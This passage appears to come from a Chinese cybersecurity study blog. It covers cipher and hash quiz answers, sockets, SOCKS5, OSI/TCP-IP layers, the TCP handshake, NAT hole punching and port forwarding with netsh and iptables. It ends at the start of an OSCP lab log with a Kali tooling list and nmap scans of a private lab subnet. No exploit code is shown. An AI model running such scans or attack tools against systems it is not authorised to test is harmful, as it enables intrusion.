<p>在流密码中，输出是基于一个内部状态生成的，该状态随着密码操作而改变。输出的是密钥流（stream），用于与明文组合生成密文。其他选项如哈希（hash）、密文（ciphertext）或明文（plaintext）都不正确。因此，正确答案是<strong>B. stream</strong>。</p>
<p><strong>问题5解析</strong></p>
<p>对于好的密码哈希函数，碰撞（collisions）是指两个不同的明文产生相同的哈希值，且难以找到。这是哈希函数安全性的重要指标。其他选项如image（映像）、preimage（原像）或solution（解）不直接指代碰撞。因此，正确答案是<strong>A. collisions</strong>。</p>
<h1 id="2-基础解析"><a href="#2-基础解析" class="headerlink" title="2-基础解析"></a>2-基础解析</h1><h2 id="1-套接字和sock5"><a href="#1-套接字和sock5" class="headerlink" title="1&gt;套接字和sock5"></a>1&gt;套接字和sock5</h2><h3 id="第一部分：套接字是什么？"><a href="#第一部分：套接字是什么？" class="headerlink" title="第一部分：套接字是什么？"></a>第一部分：套接字是什么？</h3><p><strong>套接字</strong>，也叫<strong>插座</strong>，是网络通信的<strong>基石</strong>和<strong>编程接口</strong>。</p>
<h4 id="一个简单的比喻：电话系统"><a href="#一个简单的比喻：电话系统" class="headerlink" title="一个简单的比喻：电话系统"></a>一个简单的比喻：电话系统</h4><ul>
<li><strong>IP 地址</strong>：就像是你家的<strong>街道地址</strong>。它告诉别人你的电脑在网络上的位置。</li>
<li><strong>端口号</strong>：就像是你家的<strong>具体房间号</strong>（比如201房、305房）。一个地址可以有多个房间，每个房间提供不同的服务。</li>
<li><strong>套接字</strong>：就像是你的<strong>一部电话机</strong>。你把这部电话机放在某个房间（绑定到一个IP地址和端口），然后就可以用这部电话来接听或拨打电话了。</li>
</ul>
<h4 id="技术性定义"><a href="#技术性定义" class="headerlink" title="技术性定义"></a>技术性定义</h4><p>套接字是操作系统提供的一组<strong>编程接口</strong>。它是由<strong>伯克利大学</strong>在Unix系统中创建的，所以也常被称为“伯克利套接字”。应用程序（比如你的浏览器、微信）通过调用这套接口，就可以进行网络通信。</p>
<p><strong>套接字的核心作用：</strong><br>它封装了底层复杂的网络协议（如TCP&#x2F;IP），为程序员提供了一套简单、统一的API，用来：</p>
<ol>
<li><strong>建立连接</strong>（如TCP的三次握手）。</li>
<li><strong>发送和接收数据</strong>。</li>
<li><strong>关闭连接</strong>。</li>
</ol>
<p><strong>一个套接字由以下要素唯一确定：</strong></p>
<ul>
<li><strong>协议</strong>（TCP 或 UDP）</li>
<li><strong>本地IP地址</strong></li>
<li><strong>本地端口号</strong></li>
<li><strong>远程IP地址</strong>（对端）</li>
<li><strong>远程端口号</strong>（对端）</li>
</ul>
<p><strong>总结：套接字不是协议，而是用来使用各种网络协议（如TCP、UDP等）进行通信的“工具”或“接口”。</strong> 几乎所有网络软件，从你的浏览器到服务器，底层都在使用套接字。</p>
<hr>
<h3 id="第二部分：SOCKS5是什么？"><a href="#第二部分：SOCKS5是什么？" class="headerlink" title="第二部分：SOCKS5是什么？"></a>第二部分：SOCKS5是什么？</h3><p>SOCKS5 是一种<strong>网络代理协议</strong>。它工作在比套接字更高的层级。</p>
<h4 id="继续用比喻来解释："><a href="#继续用比喻来解释：" class="headerlink" title="继续用比喻来解释："></a>继续用比喻来解释：</h4><ul>
<li><strong>直接通信（使用套接字）</strong>：你想和朋友说话，直接拿起电话打给他。</li>
<li><strong>通过代理通信（使用SOCKS5）</strong>：你和你朋友之间隔着一堵墙（比如公司防火墙），你不能直接打给他。于是你先打电话给一个<strong>秘书（SOCKS5代理服务器）</strong>，然后告诉秘书：“请帮我接通我朋友的电话”。秘书再替你去联系你的朋友，并在你们之间转发所有的对话内容。</li>
</ul>
<h4 id="技术性定义-1"><a href="#技术性定义-1" class="headerlink" title="技术性定义"></a>技术性定义</h4><p>SOCKS5 是 SOCKS 协议的第五个版本，它是一个旨在通过网络防火墙帮助客户端与服务器进行通信的协议。</p>
<p><strong>SOCKS5的核心作用：</strong></p>
<ol>
<li><strong>代理和转发</strong>：客户端把所有网络请求都发送给SOCKS5代理服务器，由代理服务器代为转发给真正的目标服务器。</li>
<li><strong>绕过限制</strong>：可以帮助客户端绕过网络访问限制（如公司防火墙、地区封锁等）。</li>
<li><strong>身份验证</strong>：支持用户名&#x2F;密码验证，确保只有授权用户才能使用代理。</li>
<li><strong>支持多种协议</strong>：它不仅能为HTTP网页代理，还能为任何基于TCP或UDP的流量代理，比如FTP、BT下载、在线游戏等。这是它比HTTP代理更强大的地方。</li>
</ol>
<hr>
<h3 id="核心区别与联系"><a href="#核心区别与联系" class="headerlink" title="核心区别与联系"></a>核心区别与联系</h3><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><strong>套接字</strong></th>
<th align="left"><strong>SOCKS5</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>本质</strong></td>
<td align="left"><strong>编程接口&#x2F;通信端点</strong></td>
<td align="left"><strong>网络协议</strong></td>
</tr>
<tr>
<td align="left"><strong>层级</strong></td>
<td align="left">操作系统层&#x2F;传输层</td>
<td align="left">应用层（在套接字之上运行）</td>
</tr>
<tr>
<td align="left"><strong>作用</strong></td>
<td align="left">提供<strong>基础</strong>的网络通信能力</td>
<td align="left">提供<strong>代理转发</strong>的高级功能</td>
</tr>
<tr>
<td align="left"><strong>关系</strong></td>
<td align="left"><strong>工具</strong></td>
<td align="left"><strong>服务</strong></td>
</tr>
<tr>
<td align="left"><strong>类比</strong></td>
<td align="left"><strong>电话机和电话线</strong></td>
<td align="left"><strong>秘书转接服务</strong></td>
</tr>
</tbody></table>
<h4 id="它们是如何协同工作的？"><a href="#它们是如何协同工作的？" class="headerlink" title="它们是如何协同工作的？"></a>它们是如何协同工作的？</h4><p>当你配置浏览器使用一个SOCKS5代理时，其内部工作流程是这样的：</p>
<ol>
<li>你的浏览器<strong>使用套接字</strong>，连接到SOCKS5代理服务器的IP和端口。</li>
<li>通过这个<strong>套接字连接</strong>，浏览器向代理服务器发送指令：“我想连接 <code>www.google.com:443</code>”。</li>
<li>SOCKS5代理服务器<strong>使用它自己的套接字</strong>，去连接 <code>www.google.com:443</code>。</li>
<li>连接建立后，代理服务器就在你的浏览器和Google服务器之间，通过两端的<strong>套接字</strong>来回转发数据。</li>
</ol>
<p><strong>简单来说：SOCKS5代理服务本身，就是通过套接字这个基础工具来实现的。</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><strong>套接字</strong>：是<strong>基础</strong>。没有套接字，你的电脑就无法进行任何形式的网络通信。它是“怎么通信”的问题。</li>
<li><strong>SOCKS5</strong>：是<strong>应用</strong>。它在套接字通信的基础上，增加了一层“代理”功能，解决“如何通过中介去通信”的问题。我们常说的“科学上网”工具，很多就使用了SOCKS5协议。</li>
</ul>
<p>所以，<strong>套接字不是SOCKS5</strong>，相反，SOCKS5是构建在套接字能力之上的一个具体应用协议。</p>
<h2 id="2-OSI七层模型和TCP-IP五层模型"><a href="#2-OSI七层模型和TCP-IP五层模型" class="headerlink" title="2&gt;OSI七层模型和TCP&#x2F;IP五层模型"></a>2&gt;OSI七层模型和TCP&#x2F;IP五层模型</h2><h3 id="核心区别一览"><a href="#核心区别一览" class="headerlink" title="核心区别一览"></a>核心区别一览</h3><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">OSI 七层模型 (理论模型)</th>
<th align="left">TCP&#x2F;IP 五层模型 (实践标准)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>层数</strong></td>
<td align="left">7层</td>
<td align="left">5层</td>
</tr>
<tr>
<td align="left"><strong>名称</strong></td>
<td align="left">应用层、表示层、会话层、传输层、网络层、数据链路层、物理层</td>
<td align="left"><strong>应用层</strong>、<strong>传输层</strong>、<strong>网络层</strong>、<strong>数据链路层</strong>、<strong>物理层</strong></td>
</tr>
<tr>
<td align="left"><strong>本质</strong></td>
<td align="left"><strong>理论框架</strong>、<strong>国际标准</strong>。用于理解和设计网络体系结构。</td>
<td align="left"><strong>事实上的工业标准</strong>。源于TCP&#x2F;IP协议栈，是互联网的基石。</td>
</tr>
<tr>
<td align="left"><strong>设计初衷</strong></td>
<td align="left">为全球网络提供一个通用的标准，实现不同厂商设备的完美互联。</td>
<td align="left">解决实际通信问题，推动互联网的发展和普及。</td>
</tr>
<tr>
<td align="left"><strong>相互关系</strong></td>
<td align="left"><strong>概念指导</strong></td>
<td align="left"><strong>具体实现</strong></td>
</tr>
</tbody></table>
<p>在实际应用中，物理层和数据链路层通常被一起实现，但概念上可以分开理解，例如<strong>以太网包括物理层和数据链路层</strong>，不是一个单一层的技术</p>
<hr>
<h3 id="详细分解"><a href="#详细分解" class="headerlink" title="详细分解"></a>详细分解</h3><h4 id="1-OSI-七层模型-Open-Systems-Interconnection"><a href="#1-OSI-七层模型-Open-Systems-Interconnection" class="headerlink" title="1. OSI 七层模型 (Open Systems Interconnection)"></a>1. OSI 七层模型 (Open Systems Interconnection)</h4><p>这是一个由国际标准化组织（ISO）提出的<strong>理论模型</strong>，其核心思想是“分层”，每一层都为其上一层提供服务，并且只关心与对等层的逻辑通信。</p>
<p><strong>各层功能简介：</strong></p>
<ul>
<li><strong>第7层：应用层</strong> - 为应用程序提供网络服务接口（如HTTP、FTP、SMTP）。</li>
<li><strong>第6层：表示层</strong> - 负责<strong>数据格式转换</strong>，如加密解密、压缩解压缩、编码转换（确保一个系统应用层发出的信息另一个系统的应用层能够读懂）。</li>
<li><strong>第5层：会话层</strong> - 负责建立、管理和终止<strong>会话</strong>（Session）或对话。</li>
<li><strong>第4层：传输层</strong> - 提供端到端的可靠或不可靠传输（如TCP、UDP），负责<strong>流量控制</strong>和<strong>差错校验</strong>。</li>
<li><strong>第3层：网络层</strong> - 负责<strong>逻辑寻址</strong>和<strong>路由选择</strong>，将数据包从源主机跨网络送到目标主机（如IP协议）。</li>
<li><strong>第2层：数据链路层</strong> - 负责在<strong>同一局域网内</strong>的节点到节点数据传输，提供<strong>物理寻址</strong>（MAC地址）和差错控制。</li>
<li><strong>第1层：物理层</strong> - 规定物理设备标准，负责在物理媒介上传输<strong>原始比特流</strong>（电平、光信号等）。</li>
</ul>
<h4 id="2-TCP-IP-五层模型"><a href="#2-TCP-IP-五层模型" class="headerlink" title="2. TCP&#x2F;IP 五层模型"></a>2. TCP&#x2F;IP 五层模型</h4><p>这是在OSI模型基础上，结合了互联网实际使用的<strong>TCP&#x2F;IP协议族</strong>而简化的模型，它才是当今互联网真正运行的基础。</p>
<p><strong>各层功能及与OSI对比：</strong></p>
<ul>
<li><strong>应用层</strong> - <strong>对应OSI的应用层、表示层、会话层</strong>。所有应用程序的通信细节都在这一层实现。例如，TLS&#x2F;SSL加密（表示层功能）和HTTP Cookie（会话层功能）都被视为应用程序自己处理的事情。</li>
<li><strong>传输层</strong> - 与OSI传输层功能完全一致（TCP, UDP）。</li>
<li><strong>网络层</strong> - 与OSI网络层功能完全一致（IP, ICMP, ARP）。</li>
<li><strong>数据链路层</strong> - 与OSI数据链路层功能基本一致。</li>
<li><strong>物理层</strong> - 与OSI物理层功能完全一致。</li>
</ul>
<p><strong>核心区别：</strong> TCP&#x2F;IP五层模型将OSI模型中<strong>应用层、表示层、会话层</strong>的功能全部合并到了<strong>应用层</strong>。</p>
<hr>
<h3 id="为什么会有这两种模型？它们的意义是什么？"><a href="#为什么会有这两种模型？它们的意义是什么？" class="headerlink" title="为什么会有这两种模型？它们的意义是什么？"></a>为什么会有这两种模型？它们的意义是什么？</h3><h4 id="OSI-七层模型的意义"><a href="#OSI-七层模型的意义" class="headerlink" title="OSI 七层模型的意义"></a>OSI 七层模型的意义</h4><ol>
<li><strong>教学与理解的黄金标准</strong>：OSI模型结构清晰，分层严谨，是学习和理解网络概念的最佳工具。当谈论“这个功能属于哪一层”时，我们几乎总是在使用OSI的术语。</li>
<li><strong>标准化与理论指导</strong>：它为网络协议的开发提供了一个通用的框架和蓝图，促进了网络技术的标准化。在设计新协议或分析网络问题时，OSI模型提供了一个优秀的参考框架。</li>
<li><strong>为什么没有普及实现</strong>：OSI模型过于复杂和理想化（“学院派”），协议实现笨重，商业化进程缓慢，最终被更简单、更实用的TCP&#x2F;IP协议栈所超越。</li>
</ol>
<h4 id="TCP-IP-五层模型的意义"><a href="#TCP-IP-五层模型的意义" class="headerlink" title="TCP&#x2F;IP 五层模型的意义"></a>TCP&#x2F;IP 五层模型的意义</h4><ol>
<li><strong>互联网的实际基石</strong>：它是当今互联网以及几乎所有局域网&#x2F;广域网所遵循的<strong>事实上的标准</strong>。我们使用的每一个网络服务，都运行在TCP&#x2F;IP五层模型之上。</li>
<li><strong>简洁与实用</strong>：它将OSI中与实际应用紧密相关的上三层合并，简化了模型结构，更符合协议的实际工作方式，提高了效率。</li>
<li><strong>强大的互联能力</strong>：TCP&#x2F;IP协议栈的核心设计理念就是简单和开放性，这使得它具有极强的包容性和扩展性，最终成就了全球范围的互联网。</li>
</ol>
<h3 id="总结与类比"><a href="#总结与类比" class="headerlink" title="总结与类比"></a>总结与类比</h3><p>你可以这样理解它们的关系：</p>
<ul>
<li><strong>OSI七层模型</strong> 就像一本详细的 <strong>《汽车工程学原理》</strong> 教科书。它告诉你一辆车应该由发动机、底盘、车身、电气设备四大部分组成，每个部分又细分为无数零件。它是你理解汽车构造的完美指南。</li>
<li><strong>TCP&#x2F;IP五层模型</strong> 就像你<strong>实际驾驶的那辆丰田卡罗拉</strong>。它确实包含了《汽车工程学原理》里描述的所有必要部分，但它不会严格地按照教科书去划分每一个零件归属，而是采用更高效、更实用的方式将各个系统整合在一起。</li>
</ul>
<p><strong>结论：</strong></p>
<ul>
<li><strong>学习时，用OSI七层模型来理解概念</strong>（比如，加密是在表示层，会话管理在会话层）。</li>
<li><strong>实践时，用TCP&#x2F;IP五层模型来配置和解决问题</strong>（比如，设置IP地址是在网络层，配置端口是在传输层，所有应用程序的的事情都在应用层）。</li>
</ul>
<h2 id="3-TCP三次握手"><a href="#3-TCP三次握手" class="headerlink" title="3&gt;TCP三次握手"></a>3&gt;TCP三次握手</h2><h3 id="三次握手的详细过程"><a href="#三次握手的详细过程" class="headerlink" title="三次握手的详细过程"></a>三次握手的详细过程</h3><p>假设客户端是 A，服务端是 B。</p>
<h4 id="第一次握手"><a href="#第一次握手" class="headerlink" title="第一次握手"></a>第一次握手</h4><ul>
<li><strong>动作发起者</strong>：客户端 A</li>
<li><strong>发送报文</strong>：A 向 B 发送一个 TCP 报文。</li>
<li><strong>关键标志位</strong>：<code>SYN = 1</code>。这表示这是一个“连接请求”报文。</li>
<li><strong>关键数据</strong>：<code>seq = x</code>。A 会随机选择一个初始序列号 <code>x</code>。这个序列号是后续数据传输的起点。</li>
<li><strong>状态变化</strong>：A 进入 <code>SYN-SENT</code> 状态。</li>
</ul>
<p><strong>此时 A 的想法</strong>：“我想和你建立连接，我的初始序列号是 x，你能听到我吗？”</p>
<h4 id="第二次握手"><a href="#第二次握手" class="headerlink" title="第二次握手"></a>第二次握手</h4><ul>
<li><strong>动作发起者</strong>：服务端 B</li>
<li><strong>发送报文</strong>：B 收到 A 的 SYN 报文后，会回复一个报文。</li>
<li><strong>关键标志位</strong>：<ul>
<li><code>SYN = 1</code>。表示“我同意你的连接请求”。</li>
<li><code>ACK = 1</code>。表示“我确认收到了你的序列号 x”。</li>
</ul>
</li>
<li><strong>关键数据</strong>：<ul>
<li><code>ack = x + 1</code>。B 对 A 的序列号进行确认。这个值等于 A 发来的序列号 <code>x</code> 加 1。意思是“我收到了你的序列号 x，我期望你下一次发送的数据序列号从 x+1 开始”。</li>
<li><code>seq = y</code>。B 也随机选择自己的初始序列号 <code>y</code>。</li>
</ul>
</li>
<li><strong>状态变化</strong>：B 进入 <code>SYN-RECEIVED</code> 状态。</li>
</ul>
<p><strong>此时 B 的想法</strong>：“我听到你了！我同意建立连接。这是我的初始序列号 y。另外，我确认收到了你的 x。”</p>
<h4 id="第三次握手"><a href="#第三次握手" class="headerlink" title="第三次握手"></a>第三次握手</h4><ul>
<li><strong>动作发起者</strong>：客户端 A</li>
<li><strong>发送报文</strong>：A 收到 B 的 SYN-ACK 报文后，需要再发送一个确认报文。</li>
<li><strong>关键标志位</strong>：<code>ACK = 1</code>。注意，这里的 <code>SYN</code> 标志位已经为 0 了。</li>
<li><strong>关键数据</strong>：<ul>
<li><code>ack = y + 1</code>。A 对 B 的序列号进行确认。这个值等于 B 发来的序列号 <code>y</code> 加 1。意思是“我收到了你的序列号 y，我期望你下一次发送的数据序列号从 y+1 开始”。</li>
<li><code>seq = x + 1</code>。因为第一次握手已经消耗了序列号 <code>x</code>，所以这次发送的序列号是 <code>x+1</code>。如果这个报文还携带数据，那么数据的第一个字节就是 <code>x+1</code>。</li>
</ul>
</li>
<li><strong>状态变化</strong>：A 发送完此报文后，进入 <code>ESTABLISHED</code> 状态。B 收到此报文后，也进入 <code>ESTABLISHED</code> 状态。</li>
</ul>
<p><strong>此时 A 的想法</strong>：“好的，我收到了你的确认。连接已经建立，我们可以开始传输数据了！”</p>
<p>至此，三次握手完成，双向的通信通道已经可靠地建立，双方可以开始传输数据。</p>
]]></content>
      <categories>
        <category>Information Security Engineer</category>
      </categories>
      <tags>
        <tag>Error correcting</tag>
      </tags>
  </entry>
  <entry>
    <title>p2p点对点通信</title>
    <url>/2025/09/02/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E9%80%9A%E4%BF%A1%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>学习的文章：</p>
<p><a href="https://www.cnblogs.com/xiugeng/p/12029388.html">P2P中的NAT穿越(打洞)方案详解 - 休耕 - 博客园</a></p>
<p>通信能否建立成功取决于当前的NAT设备是否支持不同端口之间的UDP数据包能否到达（即Hairpin转换特性）</p>
<span id="more"></span>

<h1 id="1-UDP打洞情景"><a href="#1-UDP打洞情景" class="headerlink" title="1-UDP打洞情景"></a>1-UDP打洞情景</h1><h2 id="1-两个客户端位于同一个NAT设备后"><a href="#1-两个客户端位于同一个NAT设备后" class="headerlink" title="1&gt;两个客户端位于同一个NAT设备后"></a>1&gt;两个客户端位于同一个NAT设备后</h2><p>​	当A向集中服务器发出消息请求与B连接，集中服务器将B的外网地址二元组以及内网地址二元组发给A，同时把A的外网以及内网的地址二元组信息发给B。</p>
<p><img src="/../image/p2p-image/1.png"></p>
<h2 id="2-两个客户端位于不同NAT设备后"><a href="#2-两个客户端位于不同NAT设备后" class="headerlink" title="2&gt;两个客户端位于不同NAT设备后"></a>2&gt;两个客户端位于不同NAT设备后</h2><p>​	在A向服务器发送的登陆消息中，包含有A的内网地址二元组信息，即10.0.0.1:4321；服务器会记录下A的内网地址二元组信息，同时会把自己观察到的A的外网地址二元组信息记录下来。同理，服务器也会记录下B的内网地址二元组信息和由服务器观察到的客户端B的外网地址二元组信息。无论A与B二者中的任何一方向服务器发送P2P连接请求，服务器都会将其记录下来的上述的外网和内网地址二元组发送给A或B。</p>
<p>​	<strong>一旦A与B都向对方的NAT设备在外网上的地址二元组发送了数据包，就打开了A与B之间的“洞”</strong></p>
<p><img src="/../image/p2p-image/2.png"></p>
<h2 id="3-两个客户端位于两层（多层）NAT设备后"><a href="#3-两个客户端位于两层（多层）NAT设备后" class="headerlink" title="3&gt;两个客户端位于两层（多层）NAT设备后"></a>3&gt;两个客户端位于两层（多层）NAT设备后</h2><p>经典示例是家庭路由器：</p>
<p>​	现在的家用网，即便是路由器映射端口过了一层但上面还有一层运营商提供的nat</p>
<p>​	<strong>存在内网地址重复的可能性</strong></p>
<p>​	因此客户端别无选择，只能使用由公网服务器观察到的A，B的公网地址二元组进行“打洞”操作，用于“打洞”的数据包将由NAT C进行转发。</p>
<p><img src="/../image/p2p-image/3.png"></p>
<h1 id="2-P2P的TCP流"><a href="#2-P2P的TCP流" class="headerlink" title="2-P2P的TCP流"></a>2-P2P的TCP流</h1><p>​	<strong>从协议层来看，TCP“打洞”与UDP“打洞”是几乎完全相同的过程</strong></p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ul>
<li>客户端A使用其与服务器的连接向服务器发送请求，要求服务器协助其连接客户端B；</li>
<li>服务器将B的公网和内网的TCP地址的二元组信息返回给A，同时服务器将A的公网和内网的地址二元组也发送给B；</li>
<li>客户端A和B使用连接服务器的端口异步地发起向对方的公网、内网地址二元组的TCP连接，同时监听各自的本地TCP端口是否有外部的连接联入；</li>
<li>A和B开始等待向外的连接是否成功，检查是否有新连接联入。如果向外的连接由于某种网络错误而失败，如：“连接被重置”或者“节点无法访问”，客户端只需要延迟一小段时间（例如延迟一秒钟），然后重新发起连接即可，延迟的时间和重复连接的次数可以由应用程序编写者来确定；</li>
<li>TCP连接建立起来以后，客户端之间应该开始鉴权操作，确保目前联入的连接就是所希望的连接。如果鉴权失败，客户端将关闭连接，并且继续等待新的连接联入。客户端通常采用“先入为主”的策略，只接受第一个通过鉴权操作的客户端，然后将进入P2P通信过程不再继续等待是否有新的连接联入。</li>
</ul>
<p><img src="/../image/p2p-image/4.png"></p>
<h1 id="3-应用"><a href="#3-应用" class="headerlink" title="3-应用"></a>3-应用</h1><p><a href="https://n2nc.sourceforge.net/reference/index.html">n2nc：Nat 2 Nat 连接器项目</a></p>
<p>n2n 是一个开放源代码的2层跨越3层的VPN程序</p>
<p>n2nc的应用介绍：<a href="https://cloud.tencent.com/developer/article/2345307">n2n动态路由异地组网方案</a></p>
<p><a href="https://github.com/samyk/pwnat">pwnat</a></p>
<hr>
<p>VPN介绍:</p>
<p><a href="https://openvpn.net/">openVPN</a></p>
<p><a href="https://pimylifeup.com/raspberry-pi-tailscale/">Tailscale</a></p>
<p><a href="https://nebula.defined.net/docs/">ZeroTier</a></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>代理记录</title>
    <url>/2025/08/27/%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	今天琢磨端口映射的时候懒得输入内网地址，想直接用回显地址找到端口服务的时候硬是找不到</p>
<h6 id="1-回显地址默认不经代理的解决办法"><a href="#1-回显地址默认不经代理的解决办法" class="headerlink" title="1&gt;回显地址默认不经代理的解决办法"></a>1&gt;回显地址默认不经代理的解决办法</h6><p><a href="https://stackoverflow.com/questions/57419408/how-to-make-firefox-use-a-proxy-server-for-localhost-connections#:~:text=You%20have%20to%20change%20another,in%20about%3Aconfig">stackoverflow网址中的解决办法</a></p>
<p>简单来说就是进入浏览器的高级配置的首选项进行更改，主要原因在于浏览器的配置默认回显地址不经过代理，如下以火狐浏览器为例：</p>
<p><img src="/../image/proxy-/1.png"></p>
<span id="more"></span>

<h1 id="1-局域网映射端口"><a href="#1-局域网映射端口" class="headerlink" title="1-局域网映射端口"></a>1-局域网映射端口</h1><h6 id="1-内网穿透-局域网端口映射"><a href="#1-内网穿透-局域网端口映射" class="headerlink" title="1&gt;内网穿透-&gt;局域网端口映射"></a>1&gt;内网穿透-&gt;局域网端口映射</h6><p>假设我连接了内网的wifi，然后访问它的web服务192.168.123.1:8080，现在我电脑开热点给其他人，让其他人访问内网的web服务，我怎么将192.168.123.1映射到我的热点（热点为nat模式）</p>
<p>#<strong>解决方案</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line">---</span><br><span class="line">#如果更多的端口映射</span><br><span class="line"><span class="comment">rem 映射Web服务 (HTTP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">80</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">80</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射HTTPS服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">443</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">443</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射远程桌面 (RDP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">3389</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">3389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SSH服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">22</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射你之前设置的8080端口</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SMB文件共享</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">445</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">445</span></span><br><span class="line"></span><br><span class="line">##linux</span><br><span class="line">#启用IP转发（临时）</span><br><span class="line">sudo sysctl -w <span class="built_in">net</span>.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">#永久</span><br><span class="line">sudo nano /etc/sysctl.conf</span><br><span class="line">#更新</span><br><span class="line">sudo sysctl -p</span><br><span class="line"># 将目标为热点IP:<span class="number">8080</span>的包，转发到内网服务器</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp -i wlan1 --dport <span class="number">8080</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>当然直接用<strong>Ngrok &#x2F; FRP (Fast Reverse Proxy) &#x2F; ew</strong>等穿透工具都可以</p>
<p>无互联网开热点的解决方案如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=allow ssid=MyHotspot key=MyPassword123</span><br><span class="line">#开启</span><br><span class="line">netsh wlan <span class="built_in">start</span> hostednetwork</span><br><span class="line">#关闭</span><br><span class="line">netsh wlan stop hostednetwork</span><br><span class="line">#查看</span><br><span class="line">netsh wlan show hostednetwork</span><br><span class="line">#删除</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=disallow</span><br><span class="line">#检查是否可以</span><br><span class="line">netsh wlan show drivers</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>article</tag>
      </tags>
  </entry>
  <entry>
    <title>oscp靶场训练</title>
    <url>/2025/08/25/oscp_attack-log/</url>
    <content><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h2><p>准备条件：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#kali系统</span><br><span class="line">kali-linux</span><br><span class="line"></span><br><span class="line">#必要的组件和更新	//运行exp</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class="line">sudo apt install -y build-essential git curl wget unzip vim tmux <span class="built_in">net</span>-tools htop</span><br><span class="line">sudo apt install -y python3 python3-pip python3-venv</span><br><span class="line">sudo apt install -y openjdk-<span class="number">17</span>-jdk</span><br><span class="line">sudo apt install -y libssl-dev</span><br><span class="line">sudo apt install -y netcat-traditional socat tcpdump wireshark</span><br><span class="line">sudo apt install -y nmap traceroute dnsutils</span><br><span class="line">sudo apt install -y exploitdb sqlmap john hydra metasploit-framework</span><br><span class="line">以及其他自定义的必要组件</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h1 id="Kioptrix"><a href="#Kioptrix" class="headerlink" title="Kioptrix"></a>Kioptrix</h1><h3 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h3><p>—–<strong>简单的使用工具排查漏洞</strong>—–</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#快速扫描</span><br><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">#全端口扫描</span><br><span class="line">nmap -p <span class="number">1</span>-<span class="number">65535</span> -T4 -A -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span></span><br></pre></td></tr></table></figure>
